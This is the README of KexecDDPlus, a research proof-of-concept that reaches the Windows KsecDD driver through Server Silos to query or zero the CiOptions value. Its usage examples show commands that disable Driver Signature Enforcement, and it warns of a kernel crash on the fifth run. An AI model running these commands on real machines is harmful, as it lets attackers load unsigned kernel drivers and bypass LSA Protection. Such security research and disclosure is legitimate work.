# KexecDDPlus

This proof-of-concept is the result of a research project that aimed at extending the work of [@floesen_](https://x.com/floesen_) on the KsecDD Windows driver.

It relies on Server Silos to access the KsecDD driver directly, without having to inject code into LSASS. This capability therefore allows it to operate even on systems on which LSA Protection is enabled.

**Tested on:**

- Windows 11 23H2 (OS Build 22631.4317)
- Windows 10 22H2 (OS Build 19045.4894)

## Disclaimer

> [!WARNING]
> This PoC can only be executed **4 times**, before crashing the kernel!

Due to the way the IOCTL `IOCTL_KSEC_IPC_SET_FUNCTION_RETURN` is handled by the KsecDD driver, this PoC can only be used 4 times. At the 5th execution, the driver will attempt to free the user-supplied buffer as if it were allocated in a kernel pool. This operation is invalid, and therefore will cause a Bug Check, *a.k.a.* a Blue Screen. To run the exploit without crashing the kernel, a machine reboot will be required.

## Usage

```console
C:\Temp>KexecDDPlus.exe

 Usage:
     KexecDDPlus.exe <CMD> [<ARGS>]

 Query the CI options value:
     KexecDDPlus.exe queryci
 Set the CI options value to 0:
     KexecDDPlus.exe disableci
 Set the CI options value:
     KexecDDPlus.exe setci <VALUE>
```

**Query the CI options value**

```console
C:\Temp>KexecDDPlus.exe queryci
[+] Silo created and initialized (path is \Silos\764).
[+] Process forked (child pid is 2740).
[+] Connected to child process!
[+] Query CiOptions request OK, current value is: 0x00000006
All done.
```

**Disable Driver Signature Enforcement (DSE) - Set CI options to 0**

```console
C:\Temp>KexecDDPlus.exe disableci
[+] Silo created and initialized (path is \Silos\768).
[+] Process forked (child pid is 5396).
[+] Connected to child process!
[+] Disable CI request OK
All done.
```

**Set the value of CI options**

```console
C:\Temp>KexecDDPlus.exe setci 6
[+] Silo created and initialized (path is \Silos\772).
[+] Process forked (child pid is 9012).
[+] Connected to child process!
[+] Set CiOptions request OK
All done.
```

## Authors

- Clément Labro
    - Mastodon: [https://infosec.exchange/@itm4n](https://infosec.exchange/@itm4n)
    - GitHub: [https://github.com/itm4n](https://github.com/itm4n)
- Romain Melchiorre
    - Twitter/X: [https://x.com/PMa1n](https://x.com/PMa1n)
    - Mastodon: [https://infosec.exchange/@pmain](https://infosec.exchange/@pmain)
    - GitHub: [https://github.com/PMain](https://github.com/PMain)

## Credit

- [@floesen_](https://x.com/floesen_) - [KExecDD](https://github.com/floesen/KExecDD)
- Claudio Contin - [LSASS rings KsecDD ext. 0](https://tierzerosecurity.co.nz/2024/04/29/kexecdd.html)
- James Forshaw ([@tiraniddo](https://infosec.exchange/@tiraniddo)) - [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)
- Lucas Di Martino - [Reversing Windows Container, episode I: Silo](https://blog.quarkslab.com/reversing-windows-container-episode-i-silo.html)
- Lucas Di Martino - [Reversing Windows Container, episode II: Silo to Server Silo](https://blog.quarkslab.com/reversing-windows-container-part-ii-silo-to-server-silo.html)
- Axel Souchet - [@0vercl0k](https://twitter.com/0vercl0k) - [rp++](https://github.com/0vercl0k/rp)